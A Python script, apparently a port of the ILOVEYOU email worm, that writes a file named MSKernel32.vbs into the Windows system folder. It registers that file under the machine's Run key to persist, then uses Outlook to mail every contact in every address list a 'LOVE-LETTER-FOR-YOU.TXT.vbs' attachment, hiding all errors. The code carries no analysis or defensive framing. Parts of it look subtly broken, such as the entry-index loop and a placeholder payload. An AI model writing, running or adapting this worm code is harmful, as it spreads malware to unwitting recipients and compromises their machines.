import os
import shutil
import winreg as reg
import sys
import win32com.client

def main():
    dirsystem = os.path.abspath(os.environ['SystemRoot'])
    eq = ""
    code = """
if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}
""".replace('[', "'").replace(']', "'").replace('%', '\\')
    code2 = code.replace('?', '"')
    code3 = code2.replace('^', '\\')
    wri = os.path.join(dirsystem, 'MSKernel32.vbs')

    try:
        with open(wri, 'w') as file:
            file.write(code3)
    except Exception as e:
        pass

    if os.path.isfile(wri):
        try:
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            regedit = reg.ConnectRegistry(None, reg.HKEY_LOCAL_MACHINE)
            key_handle = reg.OpenKey(regedit, key, 0, reg.KEY_WRITE)
            reg.SetValueEx(key_handle, 'MSKernel32', 0, reg.REG_SZ, wri)
            reg.CloseKey(key_handle)
            reg.CloseKey(regedit)
        except Exception as e:
            pass

    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        mapi = outlook.GetNamespace("MAPI")

        for ctrlists in range(1, mapi.AddressLists.Count + 1):
            a = mapi.AddressLists(ctrlists)
            x = 1
            key = r"Software\Microsoft\WAB"
            regedit = reg.ConnectRegistry(None, reg.HKEY_CURRENT_USER)
            key_handle = reg.OpenKey(regedit, key)
            regv = 1

            try:
                regv = reg.QueryValueEx(key_handle, a)[0]
            except Exception as e:
                pass

            if a.AddressEntries.Count > regv:
                for ctrentries in range(1, a.AddressEntries.Count + 1):
                    malead = a.AddressEntries(x)
                    regad = 1

                    try:
                        regad = reg.QueryValueEx(key_handle, malead)[0]
                    except Exception as e:
                        pass

                    if not regad:
                        try:
                            male = outlook.CreateItem(0)
                            male.Recipients.Add(malead.Address)
                            male.Subject = "ILOVEYOU"
                            male.Body = "\nkindly check the attached LOVELETTER coming from me."
                            male.Attachments.Add(os.path.join(dirsystem, "LOVE-LETTER-FOR-YOU.TXT.vbs"))
                            male.Send()
                            reg.SetValueEx(key_handle, malead, 0, reg.REG_DWORD, 1)
                        except Exception as e:
                            pass

                    x += 1

            reg.SetValueEx(key_handle, a, 0, reg.REG_DWORD, a.AddressEntries.Count)
            reg.CloseKey(key_handle)

    except Exception as e:
        pass

if __name__ == "__main__":
    main()
